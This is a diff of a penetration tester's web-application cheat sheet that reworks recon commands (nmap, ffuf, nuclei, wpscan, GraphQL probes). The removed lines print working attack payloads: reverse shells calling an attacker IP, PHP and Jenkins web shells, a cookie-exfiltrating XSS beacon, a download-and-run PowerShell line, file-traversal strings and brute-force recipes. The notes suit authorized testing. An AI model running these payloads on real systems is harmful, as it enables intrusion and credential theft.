@@ -1,73 +1,105 @@
 Web Apps
 
 
+# Overview
+
+Entry point for web application reconnaissance and enumeration. Vulnerability testing, Burp workflows, and authentication notes live in companion files.
+
+
+# Related Notes
+
+web-burp.txt             Burp Suite setup, assessment, Intruder, reporting
+databases.txt        SQL injection
+mobile.txt           Mobile app proxy and testing
+open-redirect.txt    Open redirect parameters and payloads
+ssl.txt              SSL/TLS testing commands
+web-auth.txt         CSRF, JWT, OAuth, CORS, IDOR, login brute force
+web-vulns.txt        XSS, SSRF, LFI, upload, traversal, SSTI, and platform checks
+
+
+# Contents
+
+Example Assessment, HTTP Methods, HTTP Response Codes, Headers, HTTP Methods Allowed,
+Fuzzing, PHP Version, Open Redirect, GraphQL and REST APIs
+
+
 # Example Assessment
 
-- Set variables and test connectivity
-URL=target.com
-IP=$(dig +short $TARGET)
-AGENT='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/145.0.3800.58'
+## Commands
 
+- Set variables
+URL=target.com
+IP=$(dig +short $URL)
+SECLISTS=/usr/share/wordlists/seclists/Discovery/Web-Content
+AGENT='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.4078.48'
+
+- Test connectivity
 ping -c 3 $URL
 traceroute $URL
 
 - Discover open ports and perform service enumeration
-nmap -Pn -n -T4 --open -sVC --stats-every 20s $URL -oA nmap
+nmap -Pn -n -T4 --open -sTVC --stats-every 20s $URL -oA nmap
 
 - Enumerate web technologies
-Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.3800.70
-whatweb -a 3 -U='AGENT ABOVE' https://$URL
-for i in `cat 443.txt` ; do whatweb -a 3 -U='AGENT ABOVE' https://$i/ > $i.txt 2>&1 ; echo Scanning $i ; done
+whatweb -a 3 -U="$AGENT" https://$URL
+while read -r i; do whatweb -a 3 -U="$AGENT" "https://$i/" > "$i.txt" 2>&1; echo "Scanning $i"; done < 443.txt
 
-Create a file called headers.txt
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.3800.70
+cat > headers.txt <<EOF
+User-Agent: $AGENT
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate, br
 Connection: keep-alive
 Upgrade-Insecure-Requests: 1
+EOF
 
 wafw00f -H headers.txt -a -i 443.txt
 
 - SSL/TLS enumeration
 https://ssllabs.com/ssltest/
+See ssl.txt for additional commands.
 
-sslyze $URL --resum --ems --http_headers --fallback --openssl_ccs --certinfo --reneg --tlsv1 --elliptic_curves --tlsv1_1 --robot --heartbleed --sslv2 --sslv3
+sslyze "$URL" --resum --reneg --heartbleed --certinfo --sslv2 --sslv3 --openssl_ccs
 
-sslscan --ipv4 --show-certificate --ssl2 --ssl3 --tlsall --no-colour $IP:443
+sslscan --ipv4 --show-certificate --ssl2 --ssl3 --tlsall --no-colour "$IP:443"
 sslscan --targets=targets.txt --ipv4 --show-certificate --ssl2 --ssl3 --tlsall --no-colour
 
 - Default configurations and files
-nikto -h https://$URL -Format htm --output nikto.htm
-Discover option 10
+nikto -h "https://$URL" -Format htm --output nikto.htm
 
-feroxbuster -u https://$URL -a 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.3800.70' \
-    --auto-tune -C 404,502,503 --no-recursion -w directory-list-2.3-small.txt --output feroxbuster.txt
+feroxbuster -u "https://$URL" -a "$AGENT" --auto-tune -C 404,502,503 --no-recursion \
+     -w "$SECLISTS/directory-list-2.3-small.txt" --output feroxbuster.txt
 Or replace -C <CODES> with -s 200
 
 - Directory enumeration
-ffuf -u https://$URL/FUZZ -mc 200,204,301,302,307,401,403 -fc 404 -c -r -t 20-40 \
-     -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.3800.70" \
-     -recursion -recursion-depth 2 \
+ffuf -u "https://$URL/FUZZ" -mc 200,204,301,302,307,401,403 -fc 404 -c -r -t 40 \
+     -H "User-Agent: $AGENT" -recursion -recursion-depth 2 \
      -e .php,.asp,.aspx,.jsp,.html,.js,.json,.bak,.old,.txt,.log \
-     -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+     -w "$SECLISTS/directory-list-2.3-medium.txt"
 
 - Discover vulnerabilities
-nuclei -u https://$URL -t vulnerabilities/ -c 10 -rl 50
+nuclei -update-templates
+nuclei -u "https://$URL" -tags cve,exposure,misconfig,vuln -c 10 -rl 50
+
+- API and schema discovery
+ffuf -u "https://$URL/FUZZ" -w "$SECLISTS/raft-large-words.txt" -mc 200,301,302,401,403 \
+     -H "User-Agent: $AGENT" -t 40
+Common paths: /api, /api/v1, /swagger, /swagger.json, /openapi.json, /graphql, /graphiql, /docs
 
 - Application specific enumeration
-davtest -url https://$URL
+davtest -url "https://$URL"
+droopescan scan drupal -u "https://$URL"
+joomscan -u "https://$URL"
+uniscan -u "https://$URL" -qw
+wpscan --url "https://$URL" --enumerate vp,vt,cb,u,m
 
-droopescan scan drupal -u https://$URL
+## Validation / False Positives
 
-joomscan -u https://$URL
+Review nikto and nuclei output in Repeater before reporting — see web-burp.txt.
+A 403 on /api or /swagger still confirms the path exists; note it for manual review.
 
-uniscan -u https://www.$URL -qweds
 
-wpscan --url https:/$URL --enumerate vp,vt,cb,u,m
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# HTTP Methods or Verbs
+# HTTP Methods
 
 GET       Used to get data from a server. Passes all parameters in the URL
 POST      Used to send data to a server. Passes all parameters in the body of the request
@@ -77,173 +109,30 @@ CONNECT   Set up a tunnel between a client and a server for SSL encryption or an
 TRACE     Used for debugging
 TRACK     Returns the full HTTP request back to the requesting client for proxy-debugging
 PUT       Used for adding content to a web app, common with RESTful APIs
+PATCH     Used for partial updates, common with RESTful APIs
 DELETE    Used for deleting content from a web app, common with RESTful APIs
-------------------------------------------------------------------------------------------------------------------------------------------------------
+
 
 # HTTP Response Codes
 
 100       Continue
 200       OK
+204       No Content
 301       Moved Permanently
-302       Found (redireect)
+302       Redirect
+304       Not Modified
 400       Bad Request
 401       Unauthorized
 403       Forbidden
 404       Not Found
+405       Method Not Allowed
 500       Internal Server Error
-------------------------------------------------------------------------------------------------------------------------------------------------------
+503       Service Unavailable
 
-# Browser Redirection
 
-<iframe SRC="http://<attacker IP>/report" height = "0" width ="0">
-attacker:  use Metasploit browser autopwn
-------------------------------------------------------------------------------------------------------------------------------------------------------
+# Headers
 
-# Cisco Router
-
-x is between 15 and 99.
-https://target.com/level/x/exec/-/show
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# ColdFusion
-
-/CFIDE/administrator/ 
-/CFIDE/debug/cf_debugFr.cfm
-/CFIDE/debug/cf_debugFr.cfm?userPage=../../etc/hosts
-/debug/cf_debugFr.cfm
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# Command Injection
-
-http://target.com/test.php?cmd=whoami
-http://target.com/test.php?cmd=nc -e /bin/sh <attacker IP> 443
-
-- Chain together commands
-;ls -la
-&&ls -la
-
-- Using commands with arguments when spaces are filtered
-&&{ls,-la}
-
-- PHP command injection using a GET request
-<?php echo system($_GET["cmd"]);?>
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# CSRF
-
-Login to the target.
-Create a list of all POST requests that do not have a unique token called ‘CSRF_Token’.
-
-Proxy > HTTP history > Filter bar > Filter by search term
-    ^POST((?!CSRF_Token).)*$
-    Click Regex
-
-Right click on the first request > Engagement tools > Generate CSRF PoC
-Test in browser > Copy
-Open a new tab in Chromium > paste
-Look for evidence that it executed whatever that HTTP request was supposed to do.
-
-https://portswigger.net/support/using-burp-to-test-for-cross-site-request-forgery-csrf
-https://portswigger.net/burp/documentation/desktop/functions/generate-csrf-poc
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# Cross-site Scripting (XSS)
-
-Occurs whenever an application takes untrusted user data and sends it to a web browser without proper validation. This allows the attacker to execute Java scripts in the victim’s browser. It can be used to steal cookies, hijack a user’s session, or redirect the user to a malicious site.
-
-Reflected     A malicious script is injected into a parameter.
-              Examples: deployed via an email, a specially crafted link. or a search box.
-Stored        Persistently stored on a web server. Inject once, and is executed every time a user visits that page.
-              Examples: guest book or comment on a message board.
-DOM-based     When JavaScript takes data from an attacker's source, such as the URL, and passes it to a sink that supports dynamic code execution
-              like eval() or innerHTML. This enables an attacker to execute malicious JavaScript, which allows them to hijack other users' accounts.
-
-<script>alert(1)</script>
-<script>alert('xss')</script>
-<script>alert(document.cookie)</script>
-
-<iframe src="http://<attacker IP/test.js>" height="0" width="0"></iframe>
-<img src="http://<attacker IP>/test.png" onload="javascript:alert('xss')"/>
-<script>new Image().src="http://<attacker IP>/test.php?output="+document.cookie;</script>
-
-Prevention:
-Use HttpOnly flags to prevent JavaScript from accessing cookies.
-Use Secure flags to only send cookies over an encrypted channel.
-Use the Content-Security-Policy HTTP response header to whitelist sources of approved content.
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# Directory Traversal
-
-http://target.com/loadImage?filename=1
-
-Use Burp Proxy > Forward
-Step through the loading process.
-When you see how the image/page is being loaded, right click in the body > Send to Repeater
-Repeater > Request
-Modify the file path > Send
-
-- Linux
-     filename=/etc/passwd                             Absolute path
-     filename=../../../etc/passwd                     Traversal
-     filename=....//....//....//etc/passwd            Nested traversal
-     filename=..%252f..%252f..%252fetc/passwd         Superfluous URL decode
-     filename=/var/www/images/../../../etc/passwd     Validation of start of path
-     filename=../../../etc/passwd%00.png              Validation of end of path
-
-- Windows
-     filename=\windows\win.ini                        Absolute path
-     filename=..\..\..\windows\win.ini                Traversal
-     filename=....\/....\/....\/etc/passwd            Nested traversal
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# DOM
-
-Document object model
-
-Page Source - pre DOM
-View Selection Source - post DOM
-Inspector - post DOM
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# File or PUT Upload Vuln
-
-- Example 1
-cp /usr/share/webshells/php/php-reverse-shell.php /home/kali/test.php
-Modify to following line:
-$ip = '127.0.0.1';  // CHANGE THIS
-Upload the file.
-nc -lvnp 1234
-firefox http://<target IP>/uploads/test.php
-View your netcat listener for a shell.
-
-Upgrade your shell to a fully interactive tty shell:
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-
-- Example 2
-Create a PHP file called shell.php
-<?php
-$cmd=$_GET["cmd"];
-$decode=base64_decode($cmd);
-os.system($decode);
-?>
-
-curl -ikL -T shell.php http://target.com/shell.php
-Once the file has been uploaded, pass Base64 encoded commands to it to get basic code execution.
-
-- Example 3
-curl -ikL -X PUT -d '<?php system($_GET["c"]);?>' http://target.com/shell.php
-
-wget -O output -o /dev/null www.target.com/test.php?cmd=$(echo id|base64)
-wget -O output -o /dev/null www.target.com/test.php?cmd=$(echo ifconfig|base64)
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# Fuzzing
-
-When fuzzing headers, disable URL Encode.
-When you are inside of a POST parameter, always use URL encoding.
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# Headers, Apache version, eTag, HTTP Basic Authentication Enabled
+## Commands
 
 nc target.com 80
 HEAD / HTTP/1.0
@@ -251,11 +140,13 @@ HEAD / HTTP/1.0
 
 curl -ikL -X HEAD target.com
 
-for i in `cat 80.txt` ; do curl -ikL -X HEAD http://$i/ > $i.txt 2>&1 ; echo Scanning $i ; done
-for i in `cat ssl.txt` ; do curl -ikL -X HEAD https://$i/ > $i.txt 2>&1 ; echo Scanning $i ; done
-------------------------------------------------------------------------------------------------------------------------------------------------------
+while read -r i; do curl -ikL -X HEAD "http://$i/" > "$i.txt" 2>&1; echo "Scanning $i"; done < 80.txt
+while read -r i; do curl -ikL -X HEAD "https://$i/" > "$i.txt" 2>&1; echo "Scanning $i"; done < ssl.txt
+
 
 # HTTP Methods Allowed
+
+## Commands
 
 nc target.com 80
 OPTIONS / HTTP/1.0
@@ -263,433 +154,68 @@ OPTIONS / HTTP/1.0
 
 curl -ikL -X OPTIONS target.com
 
-for i in `cat ssl.txt` ; do curl -ikL -X OPTIONS https://$i/ > $i.txt 2>&1 ; echo Scanning $i ; done
-------------------------------------------------------------------------------------------------------------------------------------------------------
+while read -r i; do curl -ikL -X OPTIONS "https://$i/" > "$i.txt" 2>&1; echo "Scanning $i"; done < ssl.txt
 
-# iframe
 
-<iframe src="http://<attacker IP>" width="1" height="1"></iframe>
-------------------------------------------------------------------------------------------------------------------------------------------------------
+# Fuzzing
 
-# Jenkins
+When fuzzing headers, disable URL Encode.
+When you are inside of a POST parameter, always use URL encoding.
 
-An open-source automation server that helps automate the parts of software development related to building, testing, and deploying, facilitating
-continuous integration, and delivery. It is a server-based system.
-
-root:password
-
-https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins#code-execution
-https://github.com/gquere/pwn_jenkins
-
-- Locate the Script Console (IP/script) and paste in the following reverse shell:
-String host="<attacker IP>";
-int port=8000;
-String cmd="/bin/bash";
-Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()) {while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
-
-- Setup a nc listener.
-nc -lvnp 8000
-
-- Server > Run
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# Local File Inclusion
-
-A web server allows a user to upload files without sufficiently validating the name, content, type, or size.
-After the file has been upload, an HTTP request for the file is used to trigger its execution by the web server.
-
-An attacker is able manipulate a parameter in the URL to get the web server to display a file that was not intended.
-
-- Example 1
-Use ../ to traverse directories and read sensitive files.
-Linux: http://target.com/index.php?page=../../../etc/passwd
-Windows: http://target.com/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
-
-- Example 2
-While adding a new entry in an address book web app, instead of uploading a photo, upload a web shell.
-A web shell is a malicious script that enables an attacker to execute arbitrary commands on a remote web server
-by sending HTTP requests to a particular location.
-
-Create read.php and upload it to the server.
-<?php echo file_get_contents('/etc/passwd'); ?>
-Use Burp Repeater to call the file.
-GET /files/uploads/read.php HTTP/1.1
-
-Create command.php and upload it to the server.
-<?php echo system($_GET['command']); ?>
-Use Burp Repeater to call the file.
-GET /files/uploads/command.php HTTP/1.1
-
-- Example 3
-cp /usr/share/webshells/php/php-reverse-shell.php .
-Edit the file by changing the IP and port.
-Use gobuster to brute force directories to find where the shell may have uploaded to.
-nc -lvnp 443
-http://target IP/uploads/php-reverse-shell.php
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-
-- Example 4
-cd /opt/Responder
-python3 Responder.py -I eth0
-http://target.com/index.php?page=//attacker IP/test
-Copy the account and hash to a file.
-john -w=/usr/share/wordlists/rockyou.txt <Responder hash>
-evil-winrm -i <target IP> -u <user> -p <password>
-
-- Bypass filtering
-Change the specified Content-Type to image/jpeg.
-Add a null byte and another file extension to the filename: shell.php%00.jpg
-
-Create a polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata.
-exiftool -Comment="<?php echo 'START ' . file_get_contents('/etc/passwd') . ' END'; ?>" photo.jpg -o polyglot.php
-------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # PHP Version
 
+## Commands
+
 nc target.com 80
-GET / HEAD/1.0
+GET / HTTP/1.0
+(hit enter 2x)
 
 http://target.com/aaaaa.php
 
 Firefox > Web Developer Toolbar > Information > View Response Headers
-------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Remote Code Execution
 
-<?php system("nc 192.168.1.5 443 -e /bin/bash")?>
-------------------------------------------------------------------------------------------------------------------------------------------------------
+# Open Redirect
 
-# Remote File Inclusion
+## Overview
 
-Similar to a LFI, but in this case the attacker executes code on a remote web server that they control via HTTP or FTP.
+Quick workflow for redirect parameters. See open-redirect.txt for parameters and payloads.
 
-http://target.com/index.php?page=http://<attacker IP>/test.txt
+## Commands
 
-- method 2
-<?php system("powershell -Command \"& {(New-Object System.Net.WebClient).DownloadFile('http://<attacker IP>/netcat/nc.exe','nc.exe'); cmd /c nc.exe <attacker IP> 443 -e cmd.exe\" }"); ?>
-------------------------------------------------------------------------------------------------------------------------------------------------------
+Burp > Proxy > find parameters: redirect, return, next, url, goto, continue
+Repeater > set value to https://<attacker domain> or //<attacker domain>
+Follow 302 chain to confirm external landing.
 
-# Server-side Template Injection
+## Validation / False Positives
 
-Test with: {{5*5}}
+See web-vulns.txt and web-burp.txt. Redirect to /login or same-site paths is not an open redirect.
 
-https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
-------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# SQL Injection
+# GraphQL and REST APIs
 
-See databases.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------
+## Overview
 
-# URL Encoding
+API testing after discovery of /api, /graphql, /swagger, or JSON endpoints.
 
-Reserved characters     @ $ & + = ; : , / ?
-Unsafe characters       space " < > # % { } | \ ^ ~ [ ] `
+## Commands
 
-%20       space
-%2E   .   period
-%2F   /   forward slash
-%23   #
-%3F   ?
-%26   &   ampersand
-%25   %
-%2B   +
-%40   @   at
-%27   '   single quote
-%22   "   double quote
-%3C   <   less than
-%3E   >   greater than
+- REST smoke test
+curl -ik "https://$URL/api/v1/users" -H "Authorization: Bearer <token>"
+curl -ik -X POST "https://$URL/api/v1/users" -H "Content-Type: application/json" -d '{"user":"test"}'
 
-Example: <script>alert(document.cookie);</script>
-Encoded: %3Cscript%3Ealert%28document%2Ecookie%29%3B%3C%2Fscript%3E
-------------------------------------------------------------------------------------------------------------------------------------------------------
+- GraphQL introspection
+curl -ik -X POST "https://$URL/graphql" -H "Content-Type: application/json" -d \
+'{"query":"{ __schema { types { name } } }"}'
 
-# WebDAV Extensions Enabled
+- GraphQL batching / depth (manual check in Repeater)
+Send array of queries or deeply nested query to test rate limits and authorization.
 
-msfconsole
-use auxiliary/scanner/http/webdav_scanner
+- OpenAPI / Swagger
+Browse /swagger, /swagger-ui, /openapi.json for hidden endpoints and parameters.
 
-./davtest.pl -url http://target.com
+## Validation / False Positives
 
-for i in $(cat 80.txt); do cadaver -t $i; done
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# WordPress
-
-wpscan --url http://target --enumerate p --enumerate t --enumerate u
-wpscan --url http://target -U users.txt -P passwords.txt
-
-cd /usr/share/wpscan/
-stop_user_enumeration_bypass.rb www.target.com --ids 1-1000
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# XML Injection
-
-Single quote        foo'
-Double quote        foo"
-Greater than        foo>
-Less than           foo<			
-Comment tag         foo<!--
-Ampersand           &foo
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# Setup Burp Suite Pro
-
-Target > Site map:
-    Right click on any pane > View > Tabs
-    Filter bar > click on the gear > Restore defaults
-
-Proxy > Options > Intercept Client Requests:
-    Enable URL and click Up to move to the top
-    Select File extension > Edit > copy the Match condition > OK
-
-Proxy > Options > Intercept Server Responses:
-    Enable Intercept responses based on the following rules
-    Enable URL and click Up to move to the top
-    Add: And, File extension, Does not match, Match condition: paste contents from above, OK
-
-Intruder > Options > Request Engine
-    Number of threads: 8
-    Number of retries on network failure: 2
-
-User options > Connections > Platform Authentication > enable Prompt for credentials on platform authentication failure
-
-User options > Display
-    User Interface > Font size: 15
-    HTTP Message Display > Font: Courier 15
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# Testing from home? Proxy your web traffic through a remote server.
-
-To proxy Burp Suite Pro traffic through an Ubuntu EC2 instance on AWS, 
-you need to set up a SOCKS5 proxy using SSH dynamic port forwarding.
-This will allow you to route your Burp traffic through the EC2 instance, 
-effectively masking your local IP with the EC2 instance’s public IP.
-
-ssh -i <EC2 KEY.pem> ubuntu@<EC2 IP>
-sudo apt update
-sudo apt install proxychains
-sudo vim /etc/proxychains.conf
-Add a new line at the end: socks5 127.0.0.1 1080
-exit
-
-ssh -i <EC2 KEY.pem> -D 1080 -f -N ubuntu@<EC2 IP>
-
-Split the Terminal horizontally and test connection
-nc -v 127.0.0.1 1080
-Connection to 127.0.0.1 port 1080 [tcp/socks] succeeded!
-
-- Burp
-Open Burp > Burp menu > Settings > Network > Connections
-SOCKS Proxy Host: 127.0.0.1
-SOCKS Proxy Port: 1080 (the port you specified in the SSH -D command above)
-Authentication: leave blank
-Check Do DNS lookups over SOCKS proxy
-Check Use SOCKS proxy
-
-Close the Settings > Proxy > Intercept > Open browser
-Enter https://whatismyip.org/
-The IP address should be your remote EC2 box.
-Target > Site map: this should now populate
--------------------------------------------------------------------------------------------------------------------------------------------------
-
-- Create a new Burp project
-Start Burp > Open existing project: uncheck Pause Automated Tasks
-New project on disk
-Enter a name
-Tab > rename the file if needed > Next > Start Burp
-
-- Establish scope
-Proxy > turn off the Intercept
-Open browser > browse to the target site
-Target > Site map: this should be populating
-Right click on the target URL > Add to scope > Yes
-Right click on the target URL > Expand branch
-Select Issues in the top right pane.
-
-- Browse the target
-Look for /robots.txt and /sitemap
-If either page exists, hold down on the Command button (Apple) and click on every link.
-Follow links, submit forms and login when prompted.
-Continue until you have thoroughly mapped the target.
-Target > Site map
-Locate any logout pages > right click > Remove from scope
-
-- Unrequested items
-Target > Site map > right click on the URL > Expand branch
-Look for items are shown in gray.
-Sort the top right pane by Time requested.
-This will group together the unrequested items.
-Right click on each item > Copy URL > paste in your browser.
-
-- Brute force directories
-Target > Site map > right click on the second line '/' > Send to Intruder
-Intruder > Position > Attack type: Sniper
-Clear §
-On the top line, select the forward slash '/' after GET > Add §
-Move the forward slash in front of the two symbols. It should look like: GET /§§
-Payloads > Payload Sets > Payload set: 1 > Payload type: Runtime file
-Payloads > Payload Options > Select file > raft-medium-directories.txt > Open
-Start attack
-
-- Sync results to Site map
-Scroll to the top of the list > sort by Payload
-Delete any blanks lines
-Move the Intruder window to the side so you can see the main window
-Target > Site map
-Compare the pages in the Site map to the Payloads in the Intruder window.
-Select a Payload that is not listed in the Site map
-Right click > Request in browser > In current session
-Enable In future, just copy the URL and don't show this dialog > Copy
-Open a new tab in Chromium and paste.
-Repeat as necessary.
-
-- Analyze anomalies
-Filter bar > uncheck 4xx [request error]
-Click Status to sort by ascending.
-Select the first line with a 302 Status.
-Hold down shift and select the last line with a 302 Status.
-Right click > Delete selected items > Yes
-Review uncommon HTTP status codes (5xx) > Response > Render
-Sort by Length, review minimum and maximum values > Response > Render
-
-- Attack surface
-Target > Site map > right click on the target URL > Engagement tools > Target analyzer
-Show the dynamic URLs, static URLs and parameters
-
-- Review comments
-Target > Site map > right click on the target URL > Engagement tools > Find comments
-Sort by Item
-Select each line > Response > right arrow key
-Look for sensitive information.
-
-- Visit referenced URLs
-Target > Site map > right click on the target URL > Expand branch
-Scroll to the very bottom.
-Right click on any empty folders that are greyed out > Delete branch > Yes
-Right click on any pages that are grey or red > Copy URL > Chromium > Paste & Go
-Skip pages that end with css, jpg, js, pdf or png.
-Make sure at least one page has been visited under each folder.
-Select multiple URLs by holding down shift > right click > Copy selected URLs
-Chromium > select the + on the far right to access 'Open Multiple URLs' > paste > Open URLs
-Burp > once the URLs become black > Chromium > close the open tabs.
-
-- Scan the target
-Target > Site map > right click on the target URL > Actively scan this host
-
-- Capture a packet
-Burp > Proxy > enable intercept
-Chromium > try to login to a web page.
-Burp > right click on capture > Send to Intruder
-Intruder > Position > Attack type
-
-- Types of attack
-Sniper:
-    Uses a single word list against a single variable.
-Battering ram:
-    Uses a single word list against all variables.
-Pitchfork:
-    Uses multiple word lists.
-    For example: you have a known list of usernames and a related list of passwords.
-    This will try the first username with the first password, then the second username with the second password, and so on.
-    This is useful when checking for old accounts that should have been deleted.
-Cluster bomb:
-    Uses multiple word lists.
-    For example: you have a known list of usernames and a non-related list of passwords.
-    This will try the first username with each password, then the second username with each password, and so on.
-
-- Brute force a password: Sniper
-    Clear $
-    Highlight the password you entered > Add $
-    Intruder > Payloads > Payload Options
-    Load > choose a password list > Open
-    Start attack
-    Filter bar > uncheck 4xx [request error]
-    Click Status to sort by ascending.
-    Look for a 302 (redirect). This should be a successful login.
-
-- Brute force usernames and passwords: Cluster bomb
-    Clear $
-    Highlight the username you entered > Add $
-    Highlight the password you entered > Add $
-    Intruder > Payloads > Payload Sets
-        Payload set: 1
-        Payload type: Simple list
-    Intruder > Payloads > Payload Options
-    Clear > Load > choose a username list > Open
-    Intruder > Payloads > Payload Sets
-        Payload set: 2
-        Payload type: Simple list
-    Intruder > Payloads > Payload Options
-    Clear > Load: choose a password list > Open
-    Start attack
-    Filter bar > uncheck 4xx [request error]
-    Click Status to sort by ascending.
-    Look for a 302 (redirect). This should be a successful login.
-
-- Other methods
-Hydra
-    hydra -L users.txt -P pass.txt <target IP> http-get
-
-Metasploit
-    use auxiliary/scanner/http/http_login
-    set user_file user.txt
-    set pass_file pass.txt
-    set rhosts <target IP>
-    set stop_on_success true
-    exploit
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# Check for 404 and 500 errors
-
-Add junk to the middle of a URL.
-Add a single tick (') at the end of a URL.
-Enter a single tick (') in any input field of a form and submit.
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# Manually Validate Findings
-
-File path traversal: right click in the Request body > Send to Repeater > modify the request
-XML Injection: Search in the Response body for http://www.w3.org/2001/XMLSchema.
-This is a false positive.
-XSS: right click in the Request body > Request in browser > In current browser session
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# Mobile app testing
-
-Proxy > Options > Proxy Listeners > Add > Binding:
-    Bind to port: 8081
-    Bind to address: All interfaces
-    OK > Yes
-
-iPhone: Settings > Wi-Fi > select your network > scroll to the bottom
-HTTP PROXY > Manual
-    Server: your computer's IP address.
-    Port: 8081
-
-Safari > http://burp
-    Select CA Certificate
-    It will prompt you to install, then ask for your password
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# Reporting
-
-Removed false positives.
-Select all remaining findings.
-Right click > Report selected issues > Next 4x > enter file location > Next > Close
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-Right click on the very first request >  Send to intruder
-Clear
-Put your cursor right after the / > click Add
-Payload Sets > Payload type: Runtime file
-Payload Options > Select file: sec lists > Discovery > Web_content > raft-medium-directories
-Start attack
-sort by Status
-    500  Server message
-    405  Method not allowed
-
-- User-Agent Switcher
-Intruder > clear > select user agent string > Add
-Payload Options > Select file: sec lists > Discovery > Web_content > UserAgents.fuzz.txt
-Sort by Length > Response > Render
+Introspection enabled is informational unless sensitive types or fields are exposed.
+A 401 on an API route confirms existence — pair with IDOR and auth tests in web-auth.txt.
